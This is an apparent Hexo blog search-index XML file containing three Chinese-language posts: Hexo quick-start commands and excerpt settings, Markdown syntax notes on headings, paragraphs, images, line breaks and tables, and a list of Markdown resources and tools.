<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo</title>
    <url>/2025/01/17/Hexo/</url>
    <content><![CDATA[<p>Welcome to <a href="">Hexo</a>! This is your very first post. Check <a href="">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="">troubleshooting</a> or you can ask me on <a href="">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<h2 id="博客摘要"><a href="#博客摘要" class="headerlink" title="博客摘要"></a>博客摘要</h2><h3 id="方法一：写概述"><a href="#方法一：写概述" class="headerlink" title="方法一：写概述"></a>方法一：写概述</h3><p>在文章的<code>front-matter</code>中添加<code>description</code>，其中description中的内容就会被显示在首页上，其余一律不显示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 让首页显示部分内容</span><br><span class="line">date: 2020-02-23 22:55:10</span><br><span class="line">description: 这是显示在首页的概述，正文内容均会被隐藏。</span><br></pre></td></tr></table></figure>
<p>比较不方便的是还得写一下概述，很多时候会懒得写概述，于是就需要第二种方法了。</p>
<h3 id="方法二：文章截断"><a href="#方法二：文章截断" class="headerlink" title="方法二：文章截断"></a>方法二：文章截断</h3><p>在需要截断的地方加入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
<p>首页就会显示这条以上的所有内容，隐藏接下来的所有内容。<br>例如本文会显示到修改配置上面。</p>
<p>这个明显就方便很多，但当然有利有弊，比如开头都是废话首页看着就不是很好看，因此我一般会先选择方法二，如果感觉文章前面的写的不太好再用方法一。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown 语法学习笔记</title>
    <url>/2025/01/17/markdown_1/</url>
    <content><![CDATA[<h1 id="标题语法"><a href="#标题语法" class="headerlink" title="标题语法"></a>标题语法</h1><p>要创建标题，请在单词或短语前面添加井号 (<code>#</code>) 。<code>#</code> 的数量代表了标题的级别。例如，添加三个 <code>#</code> 表示创建一个三级标题 (<code>&lt;h3&gt;</code>) (例如：<code>### My Header</code>)。<br><span id="more"></span><br>|Markdown语法|HTML|预览效果|<br>|—|—|—|<br>|<code># Heading level 1</code>|<code>&lt;h1&gt;Heading level 1&lt;/h1&gt;</code>|# Heading level 1|<br>|<code>## Heading level 2</code>|<code>&lt;h2&gt;Heading level 2&lt;/h2&gt;</code>|## Heading level 2|<br>|<code>### Heading level 3</code>|<code>&lt;h3&gt;Heading level 3&lt;/h3&gt;</code>|### Heading level 3|<br>|<code>#### Heading level 4</code>|<code>&lt;h4&gt;Heading level 4&lt;/h4&gt;</code>|#### Heading level 4|<br>|<code>##### Heading level 5</code>|<code>&lt;h5&gt;Heading level 5&lt;/h5&gt;</code>|##### Heading level 5|<br>|<code>###### Heading level 6</code>|<code>&lt;h6&gt;Heading level 6&lt;/h6&gt;</code>|###### Heading level 6|</p>
<h2 id="可选语法"><a href="#可选语法" class="headerlink" title="可选语法"></a>可选语法</h2><p>还可以在文本下方添加任意数量的 == 号来标识一级标题，或者 – 号来标识二级标题。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Heading level 1   ===============</code></td>
<td><code>&lt;h1&gt;Heading level 1&lt;/h1&gt;</code></td>
<td># Heading level 1</td>
</tr>
<tr>
<td><code>Heading level 2   ---------------</code></td>
<td><code>&lt;h2&gt;Heading level 2&lt;/h2&gt;</code></td>
<td>## Heading level 2</td>
</tr>
</tbody>
</table>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>不同的 Markdown 应用程序处理 <code>#</code> 和标题之间的空格方式并不一致。为了兼容考虑，请用一个空格在 <code>#</code> 和标题之间进行分隔。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code># Here&#39;s a Heading</code></td>
<td><code>#Here&#39;s a Heading</code></td>
</tr>
</tbody>
</table>
<h1 id="标题编号"><a href="#标题编号" class="headerlink" title="标题编号"></a>标题编号</h1><p>许多Markdown处理器支持标题的自定义ID - 一些Markdown处理器会自动添加它们。添加自定义ID允许您直接链接到标题并使用CSS对其进行修改。要添加自定义标题ID，请在与标题相同的行上用大括号括起该自定义ID。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### My Great Heading &#123;#custom-id&#125;</span><br></pre></td></tr></table></figure>
<p>HTML看起来像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h3 id=&quot;custom-id&quot;&gt;My Great Heading&lt;/h3&gt;</span><br></pre></td></tr></table></figure>
<h2 id="链接到标题ID-headid"><a href="#链接到标题ID-headid" class="headerlink" title="链接到标题ID (#headid)"></a>链接到标题ID (#headid)</h2><p>通过创建带有数字符号（<code>#</code>）和自定义标题ID的<a href="(/basic-syntax/links.html">标准链接</a>，可以链接到文件中具有自定义ID的标题。</p>
<table>
<thead>
<tr>
<th>Markdown</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[Heading IDs](#heading-ids)</code></td>
<td><code>&lt;a href=&quot;#heading-ids&quot;&gt;Heading IDs&lt;/a&gt;</code></td>
<td><a href="https://markdown.com.cn/extended-syntax/heading-ids.html#heading-ids">Heading IDs</a></td>
</tr>
</tbody>
</table>
<p>其他网站可以通过将自定义标题ID添加到网页的完整URL（例如<code>[Heading IDs](https://markdown.com.cn/extended-syntax/heading-ids.html#headid)</code>）来链接到标题。</p>
<h1 id="段落语法"><a href="#段落语法" class="headerlink" title="段落语法"></a>段落语法</h1><p>要创建段落，请使用空白行将一行或多行文本进行分隔。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>I really like using Markdown.      I think I&#39;ll use it to format all of my documents from now on.</code></td>
<td><code>&lt;p&gt;I really like using Markdown.&lt;/p&gt;      &lt;p&gt;I think I&#39;ll use it to format all of my documents from now on.&lt;/p&gt;</code></td>
<td>I really like using Markdown.<br><br>I think I’ll use it to format all of my documents from now on.</td>
</tr>
</tbody>
</table>
<h2 id="段落（Paragraph）用法的最佳实"><a href="#段落（Paragraph）用法的最佳实" class="headerlink" title="段落（Paragraph）用法的最佳实"></a>段落（Paragraph）用法的最佳实</h2><p>不要用空格（spaces）或制表符（ tabs）缩进段落。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Don&#39;t put tabs or spaces in front of your paragraphs.      Keep lines left-aligned like this.</code></td>
<td><code>This can result in unexpected formatting problems.        Don&#39;t add tabs or spaces in front of paragraphs.</code></td>
</tr>
</tbody>
</table>
<h1 id="图片语法"><a href="#图片语法" class="headerlink" title="图片语法"></a>图片语法</h1><p>要添加图像，请使用感叹号 (<code>!</code>), 然后在方括号增加替代文本，图片链接放在圆括号里，括号里的链接后可以增加一个可选的图片标题文本。</p>
<p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code>。</p>
<p>对应的HTML代码：<code>&lt;img src=&quot;图片链接&quot; alt=&quot;图片alt&quot; title=&quot;图片title&quot;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![这是图片](/assets/img/philly-magic-garden.jpg &quot;Magic Gardens&quot;)</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p><img src="https://markdown.com.cn/assets/img/philly-magic-garden.9c0b4415.jpg" alt="这是图片" title="Magic Gardens"></p>
<h2 id="链接图片"><a href="#链接图片" class="headerlink" title="链接图片"></a>链接图片</h2><p>给图片增加链接，请将图像的Markdown 括在方括号中，然后将链接添加在圆括号中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[![沙漠中的岩石图片](/assets/img/shiprock.jpg &quot;Shiprock&quot;)](https://maximusarthur.github.io)</span><br></pre></td></tr></table></figure>
<p>渲染效果如下：</p>
<p><a href="https://maximusarthur.github.io"><img src="https://markdown.com.cn/assets/img/shiprock.c3b9a023.jpg" alt="沙漠中的岩石图片" title="Shiprock"></a></p>
<h1 id="换行语法"><a href="#换行语法" class="headerlink" title="换行语法"></a>换行语法</h1><p>在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行(<code>&lt;br&gt;</code>)。</p>
<table>
<thead>
<tr>
<th>Markdown语法</th>
<th>HTML</th>
<th>预览效果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>This is the first line.     And this is the second line.</code></td>
<td><code>&lt;p&gt;This is the first line.&lt;br&gt;   And this is the second line.&lt;/p&gt;</code></td>
<td>This is the first line.  <br>And this is the second line.</td>
</tr>
</tbody>
</table>
<h2 id="换行（Line-Break）用法的最佳实践"><a href="#换行（Line-Break）用法的最佳实践" class="headerlink" title="换行（Line Break）用法的最佳实践"></a>换行（Line Break）用法的最佳实践</h2><p>几乎每个 Markdown 应用程序都支持两个或多个空格进行换行，称为 <code>结尾空格（trailing whitespace)</code> 的方式，但这是有争议的，因为很难在编辑器中直接看到空格，并且很多人在每个句子后面都会有意或无意地添加两个空格。由于这个原因，你可能要使用除结尾空格以外的其它方式来换行。幸运的是，几乎每个 Markdown 应用程序都支持另一种换行方式：HTML 的 <code>&lt;br&gt;</code> 标签。</p>
<p>为了兼容性，请在行尾添加“结尾空格”或 HTML 的 <code>&lt;br&gt;</code> 标签来实现换行。</p>
<p>还有两种其他方式我并不推荐使用。CommonMark 和其它几种轻量级标记语言支持在行尾添加反斜杠 (<code>\</code>) 的方式实现换行，但是并非所有 Markdown 应用程序都支持此种方式，因此从兼容性的角度来看，不推荐使用。并且至少有两种轻量级标记语言支持无须在行尾添加任何内容，只须键入回车键（<code>return</code>）即可实现换行。</p>
<table>
<thead>
<tr>
<th>✅  Do this</th>
<th>❌  Don’t do this</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>First line with two spaces after.     And the next line.      First line with the HTML tag after.&lt;br&gt;   And the next line.</code></td>
<td><code>First line with a backslash after.\   And the next line.      First line with nothing after.   And the next line.</code></td>
</tr>
</tbody>
</table>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>要添加表，请使用三个或多个连字符（<code>---</code>）创建每列的标题，并使用管道（<code>|</code>）分隔每列。您可以选择在表的任一端添加管道。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Syntax      | Description |</span><br><span class="line">| ----------- | ----------- |</span><br><span class="line">| Header      | Title       |</span><br><span class="line">| Paragraph   | Text        |</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Header</td>
<td>Title</td>
</tr>
<tr>
<td>Paragraph</td>
<td>Text</td>
</tr>
</tbody>
</table>
<p>单元格宽度可以变化，如下所示。呈现的输出将看起来相同。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Syntax | Description |</span><br><span class="line">| --- | ----------- |</span><br><span class="line">| Header | Title |</span><br><span class="line">| Paragraph | Text |</span><br></pre></td></tr></table></figure>
<p><strong>Tip:</strong> 使用连字符和管道创建表可能很麻烦。为了加快该过程，请尝试使用<a href="https://www.tablesgenerator.com/markdown_tables">Markdown Tables Generator</a>。使用图形界面构建表，然后将生成的Markdown格式的文本复制到文件中。</p>
<h2 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h2><p>您可以通过在标题行中的连字符的左侧，右侧或两侧添加冒号（<code>:</code>），将列中的文本对齐到左侧，右侧或中心。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Syntax      | Description | Test Text     |</span><br><span class="line">| :---        |    :----:   |          ---: |</span><br><span class="line">| Header      | Title       | Here&#x27;s this   |</span><br><span class="line">| Paragraph   | Text        | And more      |</span><br></pre></td></tr></table></figure>
<p>呈现的输出如下所示：</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Description</th>
<th>Test Text</th>
</tr>
</thead>
<tbody>
<tr>
<td>Header</td>
<td>Title</td>
<td>Here’s this</td>
</tr>
<tr>
<td>Paragraph</td>
<td>Text</td>
<td>And more</td>
</tr>
</tbody>
</table>
<h2 id="格式化表格中的文字"><a href="#格式化表格中的文字" class="headerlink" title="格式化表格中的文字"></a>格式化表格中的文字</h2><p>您可以在表格中设置文本格式。例如，您可以添加链接，代码（仅反引号（<code>`</code>）中的单词或短语，而不是代码块）和强调。</p>
<p>您不能添加标题，块引用，列表，水平规则，图像或HTML标签。</p>
<h2 id="在表中转义管道字符"><a href="#在表中转义管道字符" class="headerlink" title="在表中转义管道字符"></a>在表中转义管道字符</h2><p>您可以使用表格的HTML字符代码（<code>&amp;#124;</code>）在表中显示竖线（<code>|</code>）字符。<br><!--more--></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown 资源集</title>
    <url>/2025/01/18/markdown_2/</url>
    <content><![CDATA[<h1 id="Markdown-资源集"><a href="#Markdown-资源集" class="headerlink" title="Markdown 资源集"></a>Markdown 资源集</h1><p>这是一个收集了各种优秀的Markdown资源（库、服务、编辑器、工具、速查表等）的列表。</p>
<span id="more"></span>
<hr>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><!-- !toc (minlevel=2 omit="目录") -->
<ul>
<li><a href="#markdown">Markdown</a></li>
<li><a href="#markdown语法扩展">Markdown语法扩展</a><ul>
<li><a href="#multimarkdown-mmd">MultiMarkdown (MMD)</a></li>
<li><a href="#markdown-extra">Markdown Extra</a></li>
<li><a href="#markdown-extended-mde">Markdown Extended (MDE)</a></li>
</ul>
</li>
<li><a href="#手稿">手稿</a></li>
<li><a href="#commonmark">CommonMark</a></li>
<li><a href="#github风格的markdown-gfm">GitHub风格的Markdown (GFM)</a></li>
<li><a href="#纯味markdown-vfmd">纯味Markdown (VFMD)</a></li>
<li><a href="#markdown文档">Markdown文档</a><ul>
<li><a href="#markdown速查表--快速参考">Markdown速查表 / 快速参考</a></li>
<li><a href="#markdown入门指南--教程">Markdown入门指南 / 教程</a></li>
</ul>
</li>
<li><a href="#markdown构建模块">Markdown构建模块</a><ul>
<li><a href="#markdown库--工具">Markdown库 &amp; 工具</a></li>
<li><a href="#babelmark">Babelmark</a></li>
<li><a href="#markdown风格指南--最佳实践">Markdown风格指南 / 最佳实践</a></li>
<li><a href="#markdown-lint--风格规则检查器">Markdown Lint / 风格规则检查器</a></li>
<li><a href="#markdown-web组件--自定义元素">Markdown Web组件 / 自定义元素</a></li>
<li><a href="#markdown转网站--博客">Markdown转网站 / 博客</a></li>
<li><a href="#markdown转电子邮件">Markdown转电子邮件</a></li>
<li><a href="#markdown转演示文稿--幻灯片">Markdown转演示文稿 / 幻灯片</a></li>
<li><a href="#markdown转便携式文档格式-pdf">Markdown转便携式文档格式 (PDF)</a></li>
<li><a href="#markdown样式--文档--页面">Markdown样式 / 文档 / 页面</a></li>
<li><a href="#markdown转书籍">Markdown转书籍</a></li>
<li><a href="#markdown转目录-toc">Markdown转目录 (TOC)</a></li>
<li><a href="#markdown转markdown预处理器">Markdown转Markdown预处理器</a></li>
</ul>
</li>
<li><a href="#转换为markdown的工具">转换为Markdown的工具</a><ul>
<li><a href="#microsoft-word转markdown">Microsoft Word转Markdown</a></li>
<li><a href="#超文本标记语言-html转markdown">超文本标记语言 (HTML) 转Markdown</a></li>
<li><a href="#源代码转markdown">源代码转Markdown</a></li>
<li><a href="#技术文档转markdown">技术文档转Markdown</a></li>
<li><a href="#屏幕录像转markdown">屏幕录像转Markdown</a></li>
<li><a href="#json转markdown">JSON转Markdown</a></li>
</ul>
</li>
<li><a href="#书籍服务">书籍服务</a></li>
<li><a href="#文章">文章</a></li>
<li><a href="#元数据">元数据</a></li>
</ul>
<!-- toc! -->
<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><p><em>email-style writing for the web by John Gruber and Aaron Swartz</em> </p>
<ul>
<li><strong>Markdown</strong> (web: <a href="http://daringfireball.net/projects/markdown">daringfireball.net/projects/markdown</a>) - 原始的Markdown语法编写和用Perl编写的处理器，由John Gruber编写；不再维护（最后一次更新于2004年12月）</li>
</ul>
<p>历史 / 起源</p>
<ul>
<li><p>Introducing Markdown by John Gruber - 2004年3月15日</p>
<blockquote>
<p>  我编写了一个名为Markdown的文本到HTML的格式化工具，现已可供下载。<br>Markdown允许网络写作者使用简单、易读的纯文本格式语法进行写作；<br>Markdown负责将其转换为有效的XHTML（或者，如果你愿意，也可以是HTML）。</p>
</blockquote>
</li>
<li><p>Dive into Markdown by John Gruber - 2004年3月19日</p>
<blockquote>
<p> 你不需要在发送电子邮件之前“预览”它——你写它，你读它，你编辑它，就在那里。</p>
<p> 事实上，我非常喜欢写电子邮件。电子邮件是我最喜欢的写作媒介。在过去的五年里，我发送了超过16,000封电子邮件。<br>平面文本电子邮件的约定使我能够清晰、准确地表达自己，而不会有任何干扰。</p>
<p>因此，有了Markdown。网络上的电子邮件风格写作。</p>
</blockquote>
</li>
<li><p>Markdown by Aaron Swartz - 2004年3月22日</p>
<blockquote>
<p>   几个月来，我一直在和John Gruber合作一个新项目。这个想法是通过允许你使用几乎相同的语法并自动将其转换为HTML，使编写简单的网页，<br>特别是博客文章，变得和写电子邮件一样容易。</p>
<p>  我们从上到下仔细研究了语法细节，试图开发出完美的格式，<br>我认为我们得到了一个非常棒的结果。我们进行了广泛的测试：在我们的博客上，在我的评论表单中，在我们的电子邮件中。</p>
</blockquote>
</li>
</ul>
<h2 id="Markdown语法扩展"><a href="#Markdown语法扩展" class="headerlink" title="Markdown语法扩展"></a>Markdown语法扩展</h2><ul>
<li><a href="http://daringfireball.net/projects/smartypants">SmartyPants</a> - 将(c)转换为？，””转换为？等 </li>
<li><a href="http://www.emoji-cheat-sheet.com">Emojis</a> - <a href="https://github.com/arvida/emoji-cheat-sheet.com">:octocat:</a></li>
<li><a href="http://criticmarkup.com">CriticMarkup</a> - <a href="https://github.com/CriticMarkup">:octocat:</a></li>
<li><a href="https://help.github.com/articles/github-flavored-markdown">GitHub风格的标记 (GFM)</a> - @mention，带[ ]和[x]的待办事项列表等</li>
</ul>
<h3 id="MultiMarkdown-MMD"><a href="#MultiMarkdown-MMD" class="headerlink" title="MultiMarkdown (MMD)"></a>MultiMarkdown (MMD)</h3><ul>
<li><a href="http://fletcherpenney.net/multimarkdown">MultiMarkdown (MMD)</a> - 由Fletcher Penney编写的Markdown扩展，增加了脚注、表格、定义列表、文档元数据（例如标题、作者、日期等）等；首次添加到MultiMarkdown.pl<ul>
<li><a href="https://rawgit.com/fletcher/human-markdown-reference/master/index.html">速查表</a>  - 语法快速参考</li>
<li><a href="https://github.com/fletcher/MMD-Test-Suite">测试套件 :octocat:</a></li>
</ul>
</li>
<li><a href="https://github.com/fletcher/MultiMarkdown">MultiMarkdown.pl :octocat:</a> - 历史上的MultiMarkdown.pl代码；用Perl编写的转换脚本（最后一次更新于2011年1月）</li>
</ul>
<h3 id="Markdown-Extra"><a href="#Markdown-Extra" class="headerlink" title="Markdown Extra"></a>Markdown Extra</h3><ul>
<li><a href="https://michelf.ca/projects/php-markdown/extra/">Markdown Extra</a> - 由Michel Fortin编写的Markdown扩展；首次添加到PHP Markdown (Extra)</li>
<li><a href="https://michelf.ca/projects/php-markdown/dingus/">Dingus</a>  - 在浏览器中尝试Markdown Extra</li>
</ul>
<h3 id="Markdown-Extended-MDE"><a href="#Markdown-Extended-MDE" class="headerlink" title="Markdown Extended (MDE)"></a>Markdown Extended (MDE)</h3><ul>
<li><a href="http://aboutmde.org">Markdown Extended (MDE) @ aboutmde.org</a><ul>
<li><a href="http://manifest.aboutmde.org">规范</a></li>
<li><a href="http://cheatsheet.aboutmde.org/">速查表</a> - 语法快速参考；示例并排显示</li>
<li><a href="http://dingus.aboutmde.org">Dingus</a> - 在浏览器中尝试Markdown Extended</li>
</ul>
</li>
<li><a href="https://github.com/piwi/markdown-extended">代码 :octocat:</a> - 用PHP编写的转换脚本</li>
</ul>
<h2 id="手稿"><a href="#手稿" class="headerlink" title="手稿"></a>手稿</h2><p><em>用于Markdown的免费书籍格式</em></p>
<p><strong>手稿</strong><br>(web: <a href="http://manuscripts.github.io"><code>manuscripts.github.io</code></a>,<br> github: <a href="https://github.com/manuscripts"><code>manuscripts</code></a>) -<br>添加book.yml用于书籍（元）信息，例如标题、作者、出版商、年份等。<br>和contents.yml用于目录和文件结构</p>
<ul>
<li>Manuscripts Book Starter Kit (github: <a href="https://github.com/manuscripts/book-starter"><code>manuscripts/book-starter</code></a>)</li>
</ul>
<h2 id="CommonMark"><a href="#CommonMark" class="headerlink" title="CommonMark"></a>CommonMark</h2><p><em>一个强烈规范、高度兼容的Markdown实现</em></p>
<p><strong>CommonMark</strong><br>(web: <a href="http://commonmark.org"><code>commonmark.org</code></a>)</p>
<ul>
<li>规范 (web: <a href="http://spec.commonmark.org"><code>spec.commonmark.org</code></a>) - 由John MacFarlane编辑 </li>
<li>Dingus (web: <a href="http://spec.commonmark.org/dingus"><code>spec.commonmark.org/dingus</code></a>) - 在浏览器中尝试CommonMark</li>
<li>讨论 (web: <a href="http://talk.commonmark.org"><code>talk.commonmark.org</code></a>)</li>
<li>代码 (github: <a href="https://github.com/jgm/CommonMark"><code>jgm/CommonMark</code></a>) - 规范和用JavaScript和C编写的参考代码</li>
</ul>
<h2 id="GitHub-Flavored-Markdown-GFM"><a href="#GitHub-Flavored-Markdown-GFM" class="headerlink" title="GitHub Flavored Markdown (GFM)"></a>GitHub Flavored Markdown (GFM)</h2><p><em>CommonMark with GitHub Extensions</em></p>
<p><strong>GitHub Flavored Markdown (GFM)</strong></p>
<ul>
<li>Spec (web: <a href="https://github.github.com/gfm">github.github.com/gfm</a>) </li>
<li>Code (github: <a href="https://github.com/github/cmark">github/cmark</a> - reference code in C (fork of cmark w/ extensions)</li>
</ul>
<p>扩展包括：</p>
<p>Leaf Blocks: 表格 ++<br>Container Blocks: 任务列表项 ++<br>Inlines: 删除线；自动链接；禁止原始 HTML</p>
<h2 id="Vanilla-Flavored-Markdown-VFMD"><a href="#Vanilla-Flavored-Markdown-VFMD" class="headerlink" title="Vanilla Flavored Markdown (VFMD)"></a>Vanilla Flavored Markdown (VFMD)</h2><p><em>A variant of Markdown with an unambiguous specification of its syntax</em> </p>
<p><strong>Vanilla Flavored Markdown (VFMD)</strong><br>(web: <a href="http://www.vfmd.org">vfmd.org</a>, github: <a href="https://github.com/vfmd">vfmd</a>) </p>
<ul>
<li>Spec (web: <a href="http://www.vfmd.org/vfmd-spec/specification">vfmd.org/vfmd-spec/specification</a>) - Edited by Roopesh Chander</li>
<li>Code (github: <a href="https://github.com/vfmd/vfmd-src">vfmd/vfmd-src</a>) - reference code in C++</li>
</ul>
<p>不同之处包括：</p>
<p>单词内强调；<br>引用链接/图片语法简化；<br>列表和 4 空格规则；<br>更好的自动链接检测；<br>双空行作为块的结束；<br>列表的起始数字；<br>嵌套结构错误；<br>包含原始 HTML；<br>字符编码</p>
<h2 id="Markdown-文档"><a href="#Markdown-文档" class="headerlink" title="Markdown 文档"></a>Markdown 文档</h2><h3 id="Markdown-速查表-快速参考"><a href="#Markdown-速查表-快速参考" class="headerlink" title="Markdown 速查表 / 快速参考"></a>Markdown 速查表 / 快速参考</h3><ul>
<li><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown 速查表 :octocat:</a> </li>
<li><a href="https://github.com/lifeparticle/Markdown-Cheatsheet">终极 Markdown 速查表</a> </li>
</ul>
<h3 id="Markdown-入门指南-教程"><a href="#Markdown-入门指南-教程" class="headerlink" title="Markdown 入门指南 / 教程"></a>Markdown 入门指南 / 教程</h3><ul>
<li><a href="http://markdowntutorial.com">Markdown 教程</a> - <a href="https://github.com/gjtorikian/markdowntutorial.com">:octocat:</a> </li>
<li><a href="https://guides.github.com/features/mastering-markdown">掌握 Markdown @ GitHub 指南</a> </li>
<li><a href="https://help.github.com/articles/markdown-basics">Markdown 基础 @ GitHub 帮助</a> </li>
<li><a href="https://www.markdownguide.org/">Markdown 指南</a> </li>
</ul>
<h2 id="Markdown-构建块"><a href="#Markdown-构建块" class="headerlink" title="Markdown 构建块"></a>Markdown 构建块</h2><h3 id="Markdown-库-amp-工具"><a href="#Markdown-库-amp-工具" class="headerlink" title="Markdown 库 &amp; 工具"></a>Markdown 库 &amp; 工具</h3><p><a name="pandoc"></a><br><strong>Pandoc</strong><br>(web: <a href="http://pandoc.org">pandoc.org</a>, github: <a href="https://github.com/jgm/pandoc">github.com/jgm/pandoc</a>) - 一个通用文档转换器（用 Haskell 编写）</p>
<p><strong>kramdown</strong><br>(web: <a href="http://kramdown.gettalong.org">kramdown.gettalong.org</a>, github: <a href="https://github.com/gettalong/kramdown">gettalong/kramdown</a>, gem: <a href="https://rubygems.org/gems/kramdown">kramdown</a>) - Markdown 库和命令行工具（用 Ruby 编写）</p>
<p><strong>Markdown Extended (MDE)</strong><br>(github: <a href="https://github.com/e-picas/markdown-extended">e-picas/markdown-extended</a> - 将纯文本输入（字符串或文件）转换为各种输出格式（用 PHP 编写）<br><a name="marked"></a><br><strong>marked</strong><br>(web: <a href="https://marked.js.org">marked.js.org</a>, github: <a href="https://github.com/markedjs/marked">marked :octocat:</a>) - 一个 Markdown 解析器和编译器。为速度而构建。（用 Javascript 编写）</p>
<p><a name="markdown-it"></a></p>
<p><strong>markdown-it</strong><br>(web: <a href="https://markdown-it.github.io/">markdown-it.github.io</a>, github: <a href="https://github.com/markdown-it/markdown-it">markdown-it :octocat:</a>) - Javascript Markdown 解析器。100% CommonMark 支持，扩展，语法插件和高速。<br>可通过 <a href="https://www.npmjs.com/search?q=keywords:markdown-it-plugin">插件</a> 进行扩展。</p>
<p><strong>concat-md</strong><br>(<a href="https://www.npmjs.com/package/concat-md">npm</a>, <a href="https://github.com/ozum/concat-md#readme">github</a>) - CLI 和 API 用于连接 Markdown 文件并根据需要进行修改。还可以从 FrontMatter、文件名和目录名添加标题，降低现有标题的级别以符合添加的标题。</p>
<p><strong>mdcode</strong><br>(github: <a href="https://github.com/szkiba/mdcode">mdcode</a>) - Markdown 代码块编写工具。它支持可测试的代码块，实现代码块与源文件之间的双向同步。</p>
<h3 id="Babelmark"><a href="#Babelmark" class="headerlink" title="Babelmark"></a>Babelmark</h3><ul>
<li><a href="">Babelmark 2</a> - 一个用于比较各种 Markdown 语法实现输出的工具<ul>
<li><a href="http://johnmacfarlane.net/babelmark2/faq.html">Babelmark 2 F.A.Q.</a> - 常见问题（及答案）例如 … ??</li>
</ul>
</li>
</ul>
<h3 id="Markdown-风格指南-最佳实践"><a href="#Markdown-风格指南-最佳实践" class="headerlink" title="Markdown 风格指南 / 最佳实践"></a>Markdown 风格指南 / 最佳实践</h3><p>待完成</p>
<h3 id="Markdown-Lint-风格规则检查器"><a href="#Markdown-Lint-风格规则检查器" class="headerlink" title="Markdown Lint / 风格规则检查器"></a>Markdown Lint / 风格规则检查器</h3><ul>
<li><a href="https://github.com/DavidAnson/markdownlint">markdownlint</a> - 一个 Node.js 风格检查器和 lint 工具，为 Markdown/CommonMark 文件提供一套良好的默认设置。允许自定义。</li>
<li><a href="https://github.com/executablebooks/mdformat">mdformat</a> - CommonMark 兼容的 Markdown 格式化器</li>
<li><a href="">mdlint</a> 待完成</li>
<li><a href="https://github.com/hougesen/mdsf">mdsf</a> - 使用你偏好的代码格式化器来格式化 Markdown 代码片段。</li>
<li><a href="https://github.com/DavidAnson/vscode-markdownlint">vscode-markdownlint</a> - <a href="https://marketplace.visualstudio.com/items?itemName=DavidAnson.vscode-markdownlint">Visual Studio Code 插件</a> 启用 markdown 文件的原位 linting。</li>
</ul>
